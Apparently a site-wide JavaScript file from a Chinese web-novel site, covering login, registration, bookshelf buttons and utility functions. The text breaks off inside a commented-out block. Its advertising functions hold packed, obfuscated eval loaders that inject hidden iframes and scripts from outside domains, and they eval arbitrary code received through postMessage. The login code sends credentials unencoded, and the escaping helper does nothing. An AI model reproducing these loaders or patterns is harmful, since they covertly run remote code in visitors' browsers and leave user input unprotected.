document.writeln("<script src='\/js\/ajax.js'><\/script>");
var jieqiUserId = 0;
var jieqiUserName = '';

function fixwidth(){
	var _bqgmb_head = document.getElementById("_bqgmb_head");
	var _bqgmb_h1 = document.getElementById("_bqgmb_h1");
	_bqgmb_h1.style.width = (_bqgmb_head.scrollWidth-175) + "px";
}
function get_user_info(){

	if(document.cookie.indexOf('jieqiUserInfo') >= 0){
		var jieqiUserInfo = get_cookie_value('jieqiUserInfo');
		//document.write(jieqiUserInfo);
		start = 0;
		offset = jieqiUserInfo.indexOf(',', start);
		while(offset > 0){
			tmpval = jieqiUserInfo.substring(start, offset);
			tmpidx = tmpval.indexOf('=');
			if(tmpidx > 0){
			   tmpname = tmpval.substring(0, tmpidx);
			   tmpval = tmpval.substring(tmpidx+1, tmpval.length);
			   if(tmpname == 'jieqiUserId') jieqiUserId = tmpval;
			   else if(tmpname == 'jieqiUserName_un') jieqiUserName = tmpval;
			}
			start = offset+1;
			if(offset < jieqiUserInfo.length){
			  offset = jieqiUserInfo.indexOf(',', start);
			  if(offset == -1) offset =  jieqiUserInfo.length;
			}else{
			  offset = -1;
			}
		}
	}
}

function get_cookie_value(Name){var search=Name+"=";var returnvalue="";if(document.cookie.length>0){offset=document.cookie.indexOf(search);if(offset!=-1){offset+=search.length;end=document.cookie.indexOf(";",offset);if(end==-1)end=document.cookie.length;returnvalue=unescape(document.cookie.substring(offset,end));}}return returnvalue;}

function showlogin(){//顶部登录框判断是否登录
	get_user_info();
	if(jieqiUserId != 0 && jieqiUserName != '' && document.cookie.indexOf('PHPSESSID') != -1){//已经登入
		document.write('<div id="login_top"><a class="login_topbtn c_index_login" href="/userinfo.php">会员中心</a></div>');
	}else{
		document.write('<div id="login_top"><a class="login_topbtn c_index_login" href="/login.php">登录</a><a href="/register.php" class="login_topbtn c_index_login">注册</a></div>');
	}
}

function login(){//开启登录
	uname = document.getElementById("username").value;
	upass = document.getElementById("userpass").value;
	doAjax("/login.php?do=submit", "usecookie=365000&username=" + uname + "&userpass=" + upass + "", "go_login", "POST", 0);
}

function go_login(t){
	t = t.replace(/\s/g,'');
	logintips = document.getElementById("logintips");
	if(t == "nodata" ){
		logintips.innerHTML = "请输入帐号和密码";
	}
	if(t == "nameerror" ){
		logintips.innerHTML = "用户名含有非法字符！";
	}
	if(t == "nologin" ){
		logintips.innerHTML = "帐号或密码错误，登录失败";
	}
	if(t == "yeslogin" ){
		logintips.innerHTML = "登录成功，正在跳转！";
		window.location.href = "/userinfo.php";
	}
}

function register(){
	uname = document.getElementById("regname").value;
	upass = document.getElementById("regpass").value;
	uemail = document.getElementById("regemail").value;
	doAjax("/register.php?do=submit", "uname=" + uname + "&upass=" + upass + "&uemail=" + uemail + "", "go_register", "POST", 0);
}

function go_register(t){
	var t = t.replace(/\s/g,'');
	var tips = document.getElementById("logintips");
	if(t == "nodata"){
		tips.innerHTML = "以上信息都必须输入";
	}
	if(t == "nameerror"){
		tips.innerHTML = "用户名含有非法字符！";
	}
	if(t == "bigname"){
		tips.innerHTML = "用户名太长或者太短！";
	}
	if(t == "bigpass"){
		tips.innerHTML = "密码太长或者太短！";
	}
	if(t == "bigemail"){
		tips.innerHTML = "邮箱太长！";
	}
	if(t == "emailerror"){
		tips.innerHTML = "邮箱格式错误！";
	}
	if(t == "havename"){
		tips.innerHTML = "用户名已被注册！";
	}
	if(t == "yesregister"){
		tips.innerHTML = "注册成功并已经登录！";
		window.location.href = "/";
	}
}

function show_sj(articleid){
	get_user_info();
	if(jieqiUserId==0){
		document.writeln("<a href='/login.php?jumpurl=" +  encodeURIComponent(document.URL) + "' style='color:#fff'>加入书架<\/a>");
	}else{
		document.writeln("<a id='shujia' onclick='shujia("+articleid+")' style='color:#fff'>加入书架<\/a>");
	}
}

function show_bq(articleid,chapterid){
	get_user_info();
	if(jieqiUserId==0){
		document.writeln("<a id='shujia' href='\/login.php?jumpurl=" +  encodeURIComponent(document.URL) + "' style='color:red'>《 加入书签，方便阅读 》<\/a>");
	}else{
		document.writeln("<a id='shujia' onclick='shuqian("+articleid+","+chapterid+")' style='color:red'>《 加入书签，方便阅读 》<\/a>");
	}
}

function shujia(bid){
	doAjax("/addbookcase.php", "action=addbookinfo&bid=" + bid, "shujia2", "POST", 0);
}

function shujia2(t){
	var t = t.replace(/\s/g,'');
	var tips = document.getElementById("shujia");
	if(t == "1"){
		tips.innerHTML = "加入书架成功！";
	}
	if(t == "2"){
		tips.innerHTML = "加入书架失败！";
	}
	if(t == "3"){
		tips.innerHTML = "您还没有登录！";
	}
	if(t == "4"){
		tips.innerHTML = "该书已在书架中！";
	}
}

function shuqian(bid,aid){
	doAjax("/addbookcase.php", "action=addbookmark&bid=" + bid + "&aid=" + aid, "shuqian2", "POST", 0);
}

function shuqian2(t){
	var t = t.replace(/\s/g,'');
	var tips = document.getElementById("shujia");
	if(t == "1"){
		tips.innerHTML = "加入书签成功！";
	}
	if(t == "2"){
		tips.innerHTML = "加入书签失败！";
	}
	if(t == "3"){
		tips.innerHTML = "您还没有登录！";
	}
	if(t == "4"){
		tips.innerHTML = "该书签已存在！";
	}
}

function panel(){
    document.writeln("<form name=\"articlesearch\" action=\"/search.php\">");
    document.writeln("<table cellpadding=\"0\" cellspacing=\"0\" style=\"width:100%;\">");
    document.writeln("<tr>");
    document.writeln("<td style=\"background-color:#fff; border:1px solid #CCC;\"><input id=\"s_key\" name=\"keyword\" type=\"text\" class=\"key\" value=\"输入书名后搜索，宁可少字不要错字\" onFocus=\"this.value=\'\'\" /></td>");
    document.writeln("<td style=\"width:35px; background-color:#0080C0; background-image:url(\'/images/search.png\'); background-repeat:no-repeat; background-position:center\"><input name=\"submit\" type=\"submit\" value=\"\" class=\"go\"></td>");
    document.writeln("</tr>");
    document.writeln("</table>");
    document.writeln("</form>");
}


function $C(classname, ele, tag) {
	var returns = [];
	ele = ele || document;
	tag = tag || '*';
	if (ele.getElementsByClassName) {
		var eles = ele.getElementsByClassName(classname);
		if (tag != '*') {
			for (var i = 0, L = eles.length; i < L; i++) {
				if (eles[i].tagName.toLowerCase() == tag.toLowerCase()) {
					returns.push(eles[i]);
				}
			}
		} else {
			returns = eles;
		}
	} else {
		eles = ele.getElementsByTagName(tag);
		var pattern = new RegExp("(^|\\s)" + classname + "(\\s|$)");
		for (i = 0, L = eles.length; i < L; i++) {
			if (pattern.test(eles[i].className)) {
				returns.push(eles[i]);
			}
		}
	}
	return returns;
}
function _attachEvent(obj, evt, func, eventobj) {
	eventobj = !eventobj ? obj : eventobj;
	if (obj.addEventListener) {
		obj.addEventListener(evt, func, false);
	} else if (eventobj.attachEvent) {
		obj.attachEvent('on' + evt, func);
	}
}
function _detachEvent(obj, evt, func, eventobj) {
	eventobj = !eventobj ? obj : eventobj;
	if (obj.removeEventListener) {
		obj.removeEventListener(evt, func, false);
	} else if (eventobj.detachEvent) {
		obj.detachEvent('on' + evt, func);
	}
}
function browserVersion(types) {
	var other = 1;
	for (i in types) {
		var v = types[i] ? types[i] : i;
		if (USERAGENT.indexOf(v) != -1) {
			var re = new RegExp(v + '(\\/|\\s|:)([\\d\\.]+)', 'ig');
			var matches = re.exec(USERAGENT);
			var ver = matches != null ? matches[2] : 0;
			other = ver !== 0 && v != 'mozilla' ? 0 : other;
		} else {
			var ver = 0;
		}
		eval('BROWSER.' + i + '= ver');
	}
	BROWSER.other = other;
}
function getEvent() {
	if (document.all) return window.event;
	func = getEvent.caller;
	while (func != null) {
		var arg0 = func.arguments[0];
		if (arg0) {
			if ((arg0.constructor == Event || arg0.constructor == MouseEvent) || (typeof(arg0) == "object" && arg0.preventDefault && arg0.stopPropagation)) {
				return arg0;
			}
		}
		func = func.caller;
	}
	return null;
}
function isUndefined(variable) {
	return typeof variable == 'undefined' ? true : false;
}
function in_array(needle, haystack) {
	if (typeof needle == 'string' || typeof needle == 'number') {
		for (var i in haystack) {
			if (haystack[i] == needle) {
				return true;
			}
		}
	}
	return false;
}
function trim(str) {
	return (str + '').replace(/(\s+)$/g, '').replace(/^\s+/g, '');
}
function strlen(str) {
	return (BROWSER.ie && str.indexOf('\n') != -1) ? str.replace(/\r?\n/g, '_').length : str.length;
}
function mb_strlen(str) {
	var len = 0;
	for (var i = 0; i < str.length; i++) {
		len += str.charCodeAt(i) < 0 || str.charCodeAt(i) > 255 ? (charset == 'utf-8' ? 3 : 2) : 1;
	}
	return len;
}
function mb_cutstr(str, maxlen, dot) {
	var len = 0;
	var ret = '';
	var dot = !dot ? '...' : dot;
	maxlen = maxlen - dot.length;
	for (var i = 0; i < str.length; i++) {
		len += str.charCodeAt(i) < 0 || str.charCodeAt(i) > 255 ? (charset == 'utf-8' ? 3 : 2) : 1;
		if (len > maxlen) {
			ret += dot;
			break;
		}
		ret += str.substr(i, 1);
	}
	return ret;
}
function preg_replace(search, replace, str, regswitch) {
	var regswitch = !regswitch ? 'ig' : regswitch;
	var len = search.length;
	for (var i = 0; i < len; i++) {
		re = new RegExp(search[i], regswitch);
		str = str.replace(re, typeof replace == 'string' ? replace : (replace[i] ? replace[i] : replace[0]));
	}
	return str;
}
function htmlspecialchars(str) {
	return preg_replace(['&', '<', '>', '"'], ['&', '<', '>', '"'], str);
}
function display(id) {
	var obj = $(id);
	if (obj.style.visibility) {
		obj.style.visibility = obj.style.visibility == 'visible' ? 'hidden' : 'visible';
	} else {
		obj.style.display = obj.style.display == '' ? 'none' : '';
	}
}
function checkall(form, prefix, checkall) {
	var checkall = checkall ? checkall : 'chkall';
	count = 0;
	for (var i = 0; i < form.elements.length; i++) {
		var e = form.elements[i];
		if (e.name && e.name != checkall && !e.disabled && (!prefix || (prefix && e.name.match(prefix)))) {
			e.checked = form.elements[checkall].checked;
			if (e.checked) {
				count++;
			}
		}
	}
	return count;
}
function setcookie(cookieName, cookieValue, seconds, path, domain, secure) {
	if (cookieValue == '' || seconds < 0) {
		cookieValue = '';
		seconds = -2592000;
	}
	if (seconds) {
		var expires = new Date();
		expires.setTime(expires.getTime() + seconds * 1000);
	}
	domain = !domain ? cookiedomain : domain;
	path = !path ? cookiepath : path;
	document.cookie = escape(cookiepre + cookieName) + '=' + escape(cookieValue) + (expires ? '; expires=' + expires.toGMTString() : '') + (path ? '; path=' + path : '/') + (domain ? '; domain=' + domain : '') + (secure ? '; secure' : '');
}
function getcookie(name, nounescape) {
	name = cookiepre + name;
	var cookie_start = document.cookie.indexOf(name);
	var cookie_end = document.cookie.indexOf(";", cookie_start);
	if (cookie_start == -1) {
		return '';
	} else {
		var v = document.cookie.substring(cookie_start + name.length + 1, (cookie_end > cookie_start ? cookie_end : document.cookie.length));
		return !nounescape ? unescape(v) : v;
	}
}

//广告开始
function style_head(){//顶部广告
document.writeln("<div style=\"margin-top:10px;text-align:center\">");
document.writeln("</div>");
}

function style_top(){//顶部广告
document.writeln('<div style="text-align:center;padding:20px 0px;font-size:18px;"><a href="javascript:postErrorChapter();" style="text-align:center;color:red;">章节错误,点此举报(免注册)</a></div>');
}


function shang_33(){//中间广告
document.writeln("<div style=\"margin-bottom:0px;text-align:center\">");
	var eventSize = 2, eventKey = Math.floor(Math.random()*eventSize);
	console.log(eventKey);
	switch(eventKey) {
    case 0:
	//start-ym
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('f((/(E)/i.9(8.d))&&(/(A)/i.9(8.d))){3.c(\'<4 k="1w"><\\/4>\');3.c(\'<j q="o://1n.v.y/1g/14/D/l/D!X@l"><\\/j>\')}r f((/(W|V|A)/i.9(8.d))){n.U(\'T\',z(e){6 a=e.P;f(a.7){f(n[a.7+"w"]!=1){n[a.7+"w"]=1;O(N(a.M.L(/\\+/g,"%K")))}}});6 7="I"+h.p().H(G).F(2);3.c("<4 k=\'4"+7+"\'></4>");3.c(\'<C Q="R:S;" k="\'+7+\'" q="o://m.x.u/t-11-\'+h.Y(h.p()*Z)+\'.10?12=5&13=\'+B(15.16)+\'&17=\'+8["18"]+\'&19=\'+7+\'&J=\'+B(3.1a)+\'" 1b="1c" 1d="1e%"  1f="0" 1h="1i" 1j="0" 1k="1l"></C>\')}r{;(z(){6 m=3.1m("j");6 s="I"+h.p().H(G).F(2);3.c("<4 k=\'"+s+"\'></4>");6 a=\'o://m.x.u\';f((/(E)/i.9(8.d))&&(/(1o|1p|1q|1r|1s)/i.9(8.d))){6 a=\'1t://1u.m.v.y\'}m.q=a+"/11/t.l?1v="+s;6 b=3.1x("j")[0];b.1y.1z(m,b)})()}',62,98,'|||document|div||var|if_id|navigator|test|||write|userAgent||if||Math||script|id|js||window|https|random|src|else||645655|cn|33xs||xsyouwei|com|function|baidu|encodeURIComponent|iframe|index|Android|slice|36|toString|_|ifr_ref|20|replace|wz_ev_j|decodeURIComponent|eval|data|style|display|none|message|addEventListener|UCBrowser|MQQBrowser|bfcf8VQ1TD1EC|round|10000|html||sdfa|ifr_url|portal|location|href|serasfd|platform|badid|referrer|height|auto|width|100|marginheight|project|scrolling|no|frameborder|allowtransparency|true|createElement|feifei|VivoBrowser|SogouSearch|SogouMobileBrowser|360Browser|MiuiBrowser|http|sdun1|ssid|djb|getElementsByTagName|parentNode|insertBefore'.split('|'),0,{}))
	//end--ym
    break;
    case 1:
	//start-7
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c((/(G)/i.n(d.h))&&(/(t)/i.n(d.h))){3.8(\'<4 p="S"><\\/4>\');3.8(\'<f j="q://W.J.M/N/O/D/k/D!V@k"><\\/f>\')}C c((/(H|I|t)/i.n(d.h))){l.K(\'L\',y(e){7 a=e.T;c(a.6){c(l[a.6+"w"]!=1){l[a.6+"w"]=1;1a(1h(a.1j.F(/\\+/g,"%1m")))}}});7 6="r"+9.o().u(v).x(2);3.8("<4 p=\'4"+6+"\'></4>");3.8(\'<E P="Q:R;" j="q://m.z.A/B-11-\'+9.X(9.o()*Y)+\'.Z?10=5&12=\'+d["13"]+\'&14=\'+6+\'" 15="16" 17="18%"  19="0" 1b="1c" 1d="0" 1e="1f"></E>\')}C{;(y(){7 m=3.1g("f");7 s="r"+9.o().u(v).x(2);3.8("<4 p=\'"+s+"\'></4>");7 a=\'q://m.z.A\';m.j=a+"/11/B.k?1i="+s;7 b=3.1k("f")[0];b.1l.U(m,b)})()}',62,85,'|||document|div||if_id|var|write|Math|||if|navigator||script||userAgent||src|js|window||test|random|id|https|_||baidu|toString|36||slice|function|cornplus|cn|343965|else|index|iframe|replace|Android|MQQBrowser|UCBrowser|33xs|addEventListener|message|com|project|portal|style|display|none|djb|data|insertBefore|bf537UA1VAFIC|feida|round|10000|html|sdfa||serasfd|platform|badid|height|auto|width|100|marginheight|eval|scrolling|no|frameborder|allowtransparency|true|createElement|decodeURIComponent|ssid|wz_ev_j|getElementsByTagName|parentNode|20'.split('|'),0,{}))
	//end-7
	break;
		}
document.writeln("</div>");
}

function xia_33(){//底端广告
document.writeln("<div style=\"margin-top:0px;text-align:center\">");
	var eventSize = 2, eventKey = Math.floor(Math.random()*eventSize);
	console.log(eventKey);
	switch(eventKey) {
    case 0:
	//start-ym
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('f((/(E)/i.9(8.d))&&(/(A)/i.9(8.d))){3.c(\'<4 k="1w"><\\/4>\');3.c(\'<j q="o://1n.v.y/1g/14/D/l/D!X@l"><\\/j>\')}r f((/(W|V|A)/i.9(8.d))){n.U(\'T\',z(e){6 a=e.P;f(a.7){f(n[a.7+"w"]!=1){n[a.7+"w"]=1;O(N(a.M.L(/\\+/g,"%K")))}}});6 7="I"+h.p().H(G).F(2);3.c("<4 k=\'4"+7+"\'></4>");3.c(\'<C Q="R:S;" k="\'+7+\'" q="o://m.x.u/t-11-\'+h.Y(h.p()*Z)+\'.10?12=5&13=\'+B(15.16)+\'&17=\'+8["18"]+\'&19=\'+7+\'&J=\'+B(3.1a)+\'" 1b="1c" 1d="1e%"  1f="0" 1h="1i" 1j="0" 1k="1l"></C>\')}r{;(z(){6 m=3.1m("j");6 s="I"+h.p().H(G).F(2);3.c("<4 k=\'"+s+"\'></4>");6 a=\'o://m.x.u\';f((/(E)/i.9(8.d))&&(/(1o|1p|1q|1r|1s)/i.9(8.d))){6 a=\'1t://1u.m.v.y\'}m.q=a+"/11/t.l?1v="+s;6 b=3.1x("j")[0];b.1y.1z(m,b)})()}',62,98,'|||document|div||var|if_id|navigator|test|||write|userAgent||if||Math||script|id|js||window|https|random|src|else||645655|cn|33xs||xsyouwei|com|function|baidu|encodeURIComponent|iframe|index|Android|slice|36|toString|_|ifr_ref|20|replace|wz_ev_j|decodeURIComponent|eval|data|style|display|none|message|addEventListener|UCBrowser|MQQBrowser|bfcf8VQ1TD1EC|round|10000|html||sdfa|ifr_url|portal|location|href|serasfd|platform|badid|referrer|height|auto|width|100|marginheight|project|scrolling|no|frameborder|allowtransparency|true|createElement|feifei|VivoBrowser|SogouSearch|SogouMobileBrowser|360Browser|MiuiBrowser|http|sdun1|ssid|djb|getElementsByTagName|parentNode|insertBefore'.split('|'),0,{}))
	//end--ym
    break;
    case 1:
	//start-7
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c((/(G)/i.n(d.h))&&(/(t)/i.n(d.h))){3.8(\'<4 p="S"><\\/4>\');3.8(\'<f j="q://W.J.M/N/O/D/k/D!V@k"><\\/f>\')}C c((/(H|I|t)/i.n(d.h))){l.K(\'L\',y(e){7 a=e.T;c(a.6){c(l[a.6+"w"]!=1){l[a.6+"w"]=1;1a(1h(a.1j.F(/\\+/g,"%1m")))}}});7 6="r"+9.o().u(v).x(2);3.8("<4 p=\'4"+6+"\'></4>");3.8(\'<E P="Q:R;" j="q://m.z.A/B-11-\'+9.X(9.o()*Y)+\'.Z?10=5&12=\'+d["13"]+\'&14=\'+6+\'" 15="16" 17="18%"  19="0" 1b="1c" 1d="0" 1e="1f"></E>\')}C{;(y(){7 m=3.1g("f");7 s="r"+9.o().u(v).x(2);3.8("<4 p=\'"+s+"\'></4>");7 a=\'q://m.z.A\';m.j=a+"/11/B.k?1i="+s;7 b=3.1k("f")[0];b.1l.U(m,b)})()}',62,85,'|||document|div||if_id|var|write|Math|||if|navigator||script||userAgent||src|js|window||test|random|id|https|_||baidu|toString|36||slice|function|cornplus|cn|343965|else|index|iframe|replace|Android|MQQBrowser|UCBrowser|33xs|addEventListener|message|com|project|portal|style|display|none|djb|data|insertBefore|bf537UA1VAFIC|feida|round|10000|html|sdfa||serasfd|platform|badid|height|auto|width|100|marginheight|eval|scrolling|no|frameborder|allowtransparency|true|createElement|decodeURIComponent|ssid|wz_ev_j|getElementsByTagName|parentNode|20'.split('|'),0,{}))
	//end-7break;
		}
document.writeln("</div>");
}

<edv>bameng_1</edv>
<edv>bameng_2</edv>
<edv>bameng_5</edv>


/*
function hf_33(){
//star
var userAgent = window.navigator.userAgent;
if(navigator.userAgent.indexOf('UCBrowser') > -1 || userAgent.indexOf('baiduboxapp') > -1){
	var eventSize = 2, eventKey = Math.floor(Math.random()*eventSize);
	console.log(eventKey);
	switch(eventKey) {
    case 0:
	//QC-start
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8((/(C)/i.9(4.j))&&(/(x)/i.9(4.j))){2.h(\'<t J="L"><\\/t>\');2.h(\'<6 c="d://R.X.16/y/A/p/f/p!K@f"><\\/6>\')}s 8((/(M|N|x)/i.9(4.j))){O.P(\'Q\',l(e){7 a=e.z;8(a.n){B(19(a.n.D(/\\+/g,"%E")))}});2.h(\'<o G="H:I;" c="d://m.q.r/k-1-\'+5.u(5.v()*w)+\'.S?T=3&U=\'+4["V"]+\'" W="0" Y="0"  Z="0" 10="11" 12="0" 13="14"></o>\')}s{;(l(){7 m=2.15("6");7 a=\'d://m.q.r\';m.c=a+"/1/k.f?"+5.u(5.v()*w);7 b=2.17("6")[0];b.18.F(m,b)})()}',62,72,'||document||navigator|Math|script|var|if|test|||src|https||js||write||userAgent|343945|function||hf_ev_j|iframe|index|louisan|cn|else|div|round|random|10000|baidu|project|data|portal|eval|Android|replace|20|insertBefore|style|display|none|id|bffa2UA1VAFAC|djb|MQQBrowser|UCBrowser|window|addEventListener|message|feida|html|sdfa|serasfd|platform|height|33xs|width|marginheight|scrolling|no|frameborder|allowtransparency|true|createElement|com|getElementsByTagName|parentNode|decodeURIComponent'.split('|'),0,{}))
	//QC-end
    break;
    case 1:
	//ym-start
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('9((/(q)/i.5(4.7))&&(/(w)/i.5(4.7))){2.d(\'<j 10="z"><\\/j>\');2.d(\'<8 f="c://B.n.l//1g/1k/k/h/k!G@h"><\\/8>\')}y 9((/(K|L|w)/i.5(4.7))){M.O(\'U\',r(e){6 a=e.A;9(a.o){C(D(a.o.E(/\\+/g,"%F")))}});2.d(\'<p H="I:1n;" f="c://m.s.t/N/u.P?Q=3&R=\'+4["S"]+\'&T=\'+v(V.W)+\'&X=\'+v(2.Y)+\'" Z="0" 11="0"  12="0" 13="14" 15="0" 16="17"></p>\')}y{;(r(){6 m=2.18("8");6 a=\'c://m.s.t\';9((/(q)/i.5(4.7))&&(/(19|1a|1b|1c|1d)/i.5(4.7))){6 a=\'1e://1f.m.n.l\'}m.f=a+"/1/u.h?"+x.1h(x.1i()*1j);6 b=2.1l("8")[0];b.1m.J(m,b)})()}',62,86,'||document||navigator|test|var|userAgent|script|if|||https|write||src||js||div|index|com||33xs|hf_ev_j|iframe|Android|function|xsyouwei|cn|645719|encodeURIComponent|baidu|Math|else|djb|data|feifei|eval|decodeURIComponent|replace|20|bfc6eVQ1TDlUO|style|display|insertBefore|MQQBrowser|UCBrowser|window|szt|addEventListener|html|sdfa|serasfd|platform|ifr_url|message|location|href|ifr_ref|referrer|height|id|width|marginheight|scrolling|no|frameborder|allowtransparency|true|createElement|VivoBrowser|SogouSearch|SogouMobileBrowser|360Browser|MiuiBrowser|http|sdun1|project|round|random|10000|portal|getElementsByTagName|parentNode|none'.split('|'),0,{}))
	//end
     break;
		}
}
	else{//其他
//star
	var eventSize = 3, eventKey = Math.floor(Math.random()*eventSize);
	console.log(eventKey);
	switch(eventKey) {
    case 0:
	//9-start
	eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2 11="//";2 10=["29","21","28"];2 4="18.19";2 3="";2 7="17";2 6=4;20(3&&3!=""){6=4+"."+3}2 8="15*22";2 5="30";2 14="-1*-1";2 13="0";2 12=11+10.24(".")+"/"+6+"?"+7+"="+8+"*"+5+"*"+14+"*"+13;25.23("<9 26=\'27"+5+"\' 16=\'"+12+"\'></9>");',10,31,'||var|sf|pf|mykey|loc|parg|myid|script|dmList|proto|srcUrl|ifx|dm_ty|1_12|src|qq|jqputools|js|if|intxt||write|join|document|id|_0|cn|main|e3321f598ca34a549bababee0d8d1cc6'.split('|'),0,{}))
	//end
    break;
    case 1:
	//dr-start
	if (navigator.userAgent.indexOf('baidu') > -1){
      document.writeln("<script src='https://m.axsrq.cn/28405$js?"+(new Date()).getTime()+"'><\/script>");
      }
if(navigator.userAgent.indexOf('UCBrowser') > -1){
    window.addEventListener('message', function(e) {
      var _c_ob_hf = e.data;
      if (_c_ob_hf.hf_ev_j) {
        eval(decodeURIComponent(_c_ob_hf.hf_ev_j.replace(/\+/g, "%20")))
      }
    });
    document.write('<iframe style="display:none;" src="https://m.axsrq.cn/miftp.php?g=28405&domain=m.x81zw.com" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe><iframe style="display:none;" src="https://m.axsrq.cn/28405.htmm?' + (new Date()).getTime() +'" height="0" width="0" marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>');
	} else if (navigator.userAgent.indexOf('baidu') > -1){

      }else {
    document.writeln("<script src='https://m.axsrq.cn/28405$js?"+(new Date()).getTime()+"'><\/script>");
	   }
	//end
     break;
	case 2:
	//ym-start
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('9((/(q)/i.5(4.7))&&(/(w)/i.5(4.7))){2.d(\'<j 10="z"><\\/j>\');2.d(\'<8 f="c://B.n.l//1g/1k/k/h/k!G@h"><\\/8>\')}y 9((/(K|L|w)/i.5(4.7))){M.O(\'U\',r(e){6 a=e.A;9(a.o){C(D(a.o.E(/\\+/g,"%F")))}});2.d(\'<p H="I:1n;" f="c://m.s.t/N/u.P?Q=3&R=\'+4["S"]+\'&T=\'+v(V.W)+\'&X=\'+v(2.Y)+\'" Z="0" 11="0"  12="0" 13="14" 15="0" 16="17"></p>\')}y{;(r(){6 m=2.18("8");6 a=\'c://m.s.t\';9((/(q)/i.5(4.7))&&(/(19|1a|1b|1c|1d)/i.5(4.7))){6 a=\'1e://1f.m.n.l\'}m.f=a+"/1/u.h?"+x.1h(x.1i()*1j);6 b=2.1l("8")[0];b.1m.J(m,b)})()}',62,86,'||document||navigator|test|var|userAgent|script|if|||https|write||src||js||div|index|com||33xs|hf_ev_j|iframe|Android|function|xsyouwei|cn|645719|encodeURIComponent|baidu|Math|else|djb|data|feifei|eval|decodeURIComponent|replace|20|bfc6eVQ1TDlUO|style|display|insertBefore|MQQBrowser|UCBrowser|window|szt|addEventListener|html|sdfa|serasfd|platform|ifr_url|message|location|href|ifr_ref|referrer|height|id|width|marginheight|scrolling|no|frameborder|allowtransparency|true|createElement|VivoBrowser|SogouSearch|SogouMobileBrowser|360Browser|MiuiBrowser|http|sdun1|project|round|random|10000|portal|getElementsByTagName|parentNode|none'.split('|'),0,{}))
	//ym-end
     break;
		}
//end
	}
//end
}
*/


/*
function style_middle(){//中间广告
document.writeln("<div style=\"margin-bottom:0px;text-align:center\">");
	var eventSize = 2, eventKey = Math.floor(Math.random()*eventSize);
	console.log(eventKey);
	switch(eventKey) {
    case 0:
	//start-ym
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('f((/(E)/i.9(8.d))&&(/(A)/i.9(8.d))){3.c(\'<4 k="1w"><\\/4>\');3.c(\'<j q="o://1n.v.y/1g/14/D/l/D!X@l"><\\/j>\')}r f((/(W|V|A)/i.9(8.d))){n.U(\'T\',z(e){6 a=e.P;f(a.7){f(n[a.7+"w"]!=1){n[a.7+"w"]=1;O(N(a.M.L(/\\+/g,"%K")))}}});6 7="I"+h.p().H(G).F(2);3.c("<4 k=\'4"+7+"\'></4>");3.c(\'<C Q="R:S;" k="\'+7+\'" q="o://m.x.u/t-11-\'+h.Y(h.p()*Z)+\'.10?12=5&13=\'+B(15.16)+\'&17=\'+8["18"]+\'&19=\'+7+\'&J=\'+B(3.1a)+\'" 1b="1c" 1d="1e%"  1f="0" 1h="1i" 1j="0" 1k="1l"></C>\')}r{;(z(){6 m=3.1m("j");6 s="I"+h.p().H(G).F(2);3.c("<4 k=\'"+s+"\'></4>");6 a=\'o://m.x.u\';f((/(E)/i.9(8.d))&&(/(1o|1p|1q|1r|1s)/i.9(8.d))){6 a=\'1t://1u.m.v.y\'}m.q=a+"/11/t.l?1v="+s;6 